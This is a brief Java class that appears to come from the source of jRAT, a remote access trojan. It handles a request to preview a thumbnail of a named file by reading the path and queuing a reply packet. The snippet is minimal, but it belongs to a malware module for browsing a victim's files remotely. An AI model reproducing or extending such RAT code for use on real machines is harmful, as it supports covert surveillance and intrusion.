package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.AbstractIncomingPacket;


public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();

		con.addToSendQueue(new Packet59ThumbnailPreview(file));
	}

}
